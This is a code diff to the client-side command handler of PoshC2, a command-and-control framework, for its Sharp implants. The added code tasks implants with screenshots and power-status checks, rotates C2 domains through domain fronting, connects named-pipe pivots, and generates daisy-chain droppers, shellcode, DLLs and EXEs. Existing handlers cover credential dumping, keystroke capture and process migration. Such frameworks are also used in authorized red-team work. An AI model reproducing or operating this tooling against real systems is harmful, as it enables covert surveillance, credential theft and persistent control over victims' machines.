@@ -1,26 +1,22 @@
 import base64, re, traceback, os, string, subprocess
-from poshc2.client.Alias import cs_alias, cs_replace
-from poshc2.Colours import Colours
-from poshc2.server.AutoLoads import check_module_loaded, run_autoloads_sharp
-from poshc2.client.Help import sharp_help1
-from poshc2.server.Config import PoshInstallDirectory, PoshProjectDirectory, SocksHost, PayloadsDirectory, ModulesDirectory, DatabaseType
-from poshc2.server.Config import PayloadCommsHost, DomainFrontHeader, UserAgent
-from poshc2.Utils import argp, load_file, gen_key
-from poshc2.server.Core import print_bad, print_good
-from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
-from poshc2.server.Payloads import Payloads
 from prompt_toolkit import PromptSession
 from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
 from prompt_toolkit.styles import Style
 
-
-if DatabaseType.lower() == "postgres":
-    from poshc2.server.database.DBPostgres import new_task, kill_implant, get_implantdetails, get_sharpurls
-    from poshc2.server.database.DBPostgres import select_item, update_label, get_allurls, get_c2server_all, get_newimplanturl, new_urldetails
-else:
-    from poshc2.server.database.DBSQLite import new_task, kill_implant, get_implantdetails, get_sharpurls
-    from poshc2.server.database.DBSQLite import select_item, update_label, get_allurls, get_c2server_all, get_newimplanturl, new_urldetails
+from poshc2.client.Alias import cs_alias, cs_replace
+from poshc2.Colours import Colours
+from poshc2.server.AutoLoads import check_module_loaded, run_autoloads_sharp
+from poshc2.client.Help import sharp_help
+from poshc2.server.Config import PoshInstallDirectory, PoshProjectDirectory, SocksHost, PayloadsDirectory, ModulesDirectory
+from poshc2.server.Config import PayloadCommsHost, DomainFrontHeader, UserAgent, PBindPipeName, PBindSecret
+from poshc2.Utils import argp, load_file, gen_key, get_first_url, get_first_dfheader
+from poshc2.server.Core import print_bad, print_good
+from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
+from poshc2.server.payloads.Payloads import Payloads
+from poshc2.server.PowerStatus import getpowerstatus
+from poshc2.server.database.DB import new_task, kill_implant, get_implantdetails, get_sharpurls, get_baseenckey, get_powerstatusbyrandomuri
+from poshc2.server.database.DB import select_item, update_label, get_allurls, get_c2server_all, get_newimplanturl, new_urldetails
 
 
 def handle_sharp_command(command, user, randomuri, implant_id):
@@ -42,6 +38,9 @@ def handle_sharp_command(command, user, randomuri, implant_id):
 
     if command.startswith("searchhelp"):
         do_searchhelp(user, command, randomuri)
+        return
+    elif command.startswith("searchhistory"):
+        do_searchhistory(user, command, randomuri)
         return
     elif command.startswith("upload-file"):
         do_upload_file(user, command, randomuri)
@@ -70,11 +69,23 @@ def handle_sharp_command(command, user, randomuri, implant_id):
     elif (command.startswith("get-screenshotmulti")):
         do_get_screenshotmulti(user, command, randomuri)
         return
+    elif command.startswith("get-screenshot"):
+        do_get_screenshot(user, command, randomuri)
+        return
+    elif command == "getpowerstatus":
+        do_get_powerstatus(user, command, randomuri)
+        return
+    elif command == "stoppowerstatus":
+        do_stoppowerstatus(user, command, randomuri)
+        return
     elif command.startswith("run-exe SharpWMI.Program") and "execute" in command and "payload" not in command:
         do_sharpwmi_execute(user, command, randomuri)
         return
     elif (command.startswith("get-hash")):
         do_get_hash(user, command, randomuri)
+        return
+    elif (command.startswith("enable-rotation")):
+        do_rotation(user, command, randomuri)
         return
     elif (command.startswith("safetykatz")):
         do_safetykatz(user, command, randomuri)
@@ -90,6 +101,9 @@ def handle_sharp_command(command, user, randomuri, implant_id):
         return
     elif command.startswith("modulesloaded"):
         do_modulesloaded(user, command, randomuri)
+        return
+    elif command.startswith("pbind-connect"):
+        do_pbind_start(user, command, randomuri)
         return
     elif command.startswith("dynamic-code"):
         do_dynamic_code(user, command, randomuri)
@@ -108,10 +122,18 @@ def handle_sharp_command(command, user, randomuri, implant_id):
 
 def do_searchhelp(user, command, randomuri):
     searchterm = (command).replace("searchhelp ", "")
-    helpful = sharp_help1.split('\n')
+    helpful = sharp_help.split('\n')
     for line in helpful:
         if searchterm in line.lower():
             print(Colours.GREEN + line)
+
+
+def do_searchhistory(user, command, randomuri):
+    searchterm = (command).replace("searchhistory ", "")
+    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
+        for line in hisfile:
+            if searchterm in line.lower():
+                print(Colours.GREEN + line.replace("+", ""))
 
 
 def do_upload_file(user, command, randomuri):
@@ -172,8 +194,8 @@ def do_migrate(user, command, randomuri):
     params = re.compile("migrate", re.IGNORECASE)
     params = params.sub("", command)
     implant = get_implantdetails(randomuri)
-    implant_arch = implant[10]
-    implant_comms = implant[15]
+    implant_arch = implant.Arch
+    implant_comms = implant.Pivot
     if implant_arch == "AMD64":
         arch = "64"
     else:
@@ -193,7 +215,7 @@ def do_migrate(user, command, randomuri):
 
 def do_kill_implant(user, command, randomuri):
     impid = get_implantdetails(randomuri)
-    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
+    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
     if ri.lower() == "n":
         print("Implant not terminated")
     if ri == "":
@@ -215,8 +237,8 @@ def do_sharpsocks(user, command, randomuri):
     sharpkey = gen_key().decode("utf-8")
     sharpurls = get_sharpurls()
     sharpurls = sharpurls.split(",")
-    sharpurl = select_item("PayloadCommsHost", "C2Server")
-    dfheader = select_item("DomainFrontHeader", "C2Server")
+    sharpurl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
+    dfheader = get_first_dfheader(select_item("DomainFrontHeader", "C2Server"))
     print(PoshInstallDirectory + "resources/SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN)
     ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
     if ri == "":
@@ -248,8 +270,32 @@ def do_get_keystrokes(user, command, randomuri):
 
 
 def do_get_screenshotmulti(user, command, randomuri):
+    pwrStatus = get_powerstatusbyrandomuri(randomuri)
+    if (pwrStatus is not None and pwrStatus[7]):
+        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+        if ri.lower() == "n" or ri.lower() == "":
+            return
     new_task(command, user, randomuri)
     update_label("SCREENSHOT", randomuri)
+
+
+def do_get_screenshot(user, command, randomuri):
+    pwrStatus = get_powerstatusbyrandomuri(randomuri)
+    if (pwrStatus is not None and pwrStatus[7]):
+        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+        if ri.lower() == "n" or ri.lower() == "":
+            return
+    new_task(command, user, randomuri)
+
+
+def do_get_powerstatus(user, command, randomuri):
+    getpowerstatus(randomuri)
+    new_task("run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)
+
+
+def do_stoppowerstatus(user, command, randomuri):
+    new_task(command, user, randomuri)
+    update_label("", randomuri)
 
 
 def do_get_hash(user, command, randomuri):
@@ -286,16 +332,23 @@ def do_listmodules(user, command, randomuri):
 
 def do_modulesloaded(user, command, randomuri):
     implant_details = get_implantdetails(randomuri)
-    print(implant_details[14])
+    print(implant_details.ModsLoaded)
     new_task("listmodules", user, randomuri)
 
 
 def do_help(user, command, randomuri):
-    print(sharp_help1)
+    print(sharp_help)
 
 
 def do_shell(user, command, randomuri):
     new_task(command, user, randomuri)
+
+
+def do_rotation(user, command, randomuri):
+    domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
+    domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
+    new_task("dfupdate %s" % domainfront, user, randomuri)
+    new_task("rotate %s" % domain, user, randomuri)
 
 
 def do_sharpwmi_execute(user, command, randomuri):
@@ -312,6 +365,18 @@ def do_sharpwmi_execute(user, command, randomuri):
         new_task("%s payload=%s" % (command, payload), user, randomuri)
     else:
         print_bad("Could not find file")
+
+
+def do_pbind_start(user, command, randomuri):
+    key = get_baseenckey()
+    if len(command.split()) == 2:  # 'pbind-connect <hostname>' is two args
+        command = f"{command} {PBindPipeName} {PBindSecret} {key}"
+    elif len(command.split()) == 4:  # if the pipe name and secret are already present just add the key
+        command = f"{command} {key}"
+    else:
+        print_bad("Expected 'pbind_connect <hostname>' or 'pbind_connect <hostname> <pipename> <secret>'")
+        return
+    new_task(command, user, randomuri)
 
 
 def do_dynamic_code(user, command, randomuri):
@@ -334,6 +399,7 @@ def do_startdaisy(user, command, randomuri):
     proxy_user = ""
     proxy_pass = ""
     proxy_url = ""
+    cred_expiry = ""
 
     if elevated.lower() == "n":
         cont = input(Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)
@@ -347,20 +413,25 @@ def do_startdaisy(user, command, randomuri):
 
     bind_port = input(Colours.GREEN + "Bind Port on the daisy host: " + Colours.END)
     firstdaisy = input(Colours.GREEN + "Is this the first daisy in the chain? Y/n? " + Colours.END)
+    default_url = get_first_url(PayloadCommsHost, DomainFrontHeader)
+    default_df_header = get_first_dfheader(DomainFrontHeader)
+    if default_df_header == default_url:
+        default_df_header = None
     if firstdaisy.lower() == "y" or firstdaisy == "":
-        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {PayloadCommsHost}): " + Colours.END)
-        if DomainFrontHeader:
-            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for {DomainFrontHeader}): " + Colours.END)
-        else:
-            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for configured value of no header): " + Colours.END)
+        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {default_url}): " + Colours.END)
+        domain_front = input(Colours.GREEN + f"Domain front header (leave blank for {str(default_df_header)}): " + Colours.END)
         proxy_user = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
         proxy_pass = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
         proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
+        cred_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")
 
         if not upstream_url:
-            upstream_url = PayloadCommsHost
+            upstream_url = default_url
         if not domain_front:
-            domain_front = DomainFrontHeader
+            if default_df_header:
+                domain_front = default_df_header
+            else:
+                domain_front = ""
 
     else:
         upstream_daisy_host = input(Colours.GREEN + "Upstream daisy server:  " + Colours.END)
@@ -370,7 +441,7 @@ def do_startdaisy(user, command, randomuri):
 
     urls = get_allurls().replace(" ", "")
     useragent = UserAgent
-    command = f"invoke-daisychain \"{bind_ip}\" \"{bind_port}\" \"{upstream_url}\" \"{domain_front}\" \"{proxy_url}\" \"{proxy_user}\" \"{proxy_pass}\" \"{useragent}\" {urls}"
+    command = f"invoke-daisychain \"{bind_ip}\" \"{bind_port}\" {upstream_url} {domain_front} \"{proxy_url}\" \"{proxy_user}\" \"{proxy_pass}\" \"{useragent}\" {urls}"
 
     new_task(command, user, randomuri)
     update_label("DaisyHost", randomuri)
@@ -384,14 +455,13 @@ def do_startdaisy(user, command, randomuri):
         daisyhost = get_implantdetails(randomuri)
         proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
         C2 = get_c2server_all()
-        newPayload = Payloads(C2[5], C2[2], f"http://{bind_ip}", "", f"{bind_port}", "", "", "",
-                                "", proxynone, C2[17], C2[18], C2[19], "%s?d" % get_newimplanturl(), PayloadsDirectory)
-        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
+        urlId = new_urldetails(name, f"\"http://{bind_ip}:{bind_port}\"", "\"\"", proxy_url, proxy_user, proxy_pass, cred_expiry)
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand=proxynone, URLID=urlId)
+        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
+        newPayload.CreateDroppers(name)
         newPayload.CreateRaw(name)
         newPayload.CreateDlls(name)
         newPayload.CreateShellcode(name)
         newPayload.CreateEXE(name)
         newPayload.CreateMsbuild(name)
-        newPayload.CreateCS(name)
-        new_urldetails(name, C2[1], C2[3], f"Daisy: {name}", upstream_url, daisyhost[0], "")
         print_good("Created new %s daisy payloads" % name)
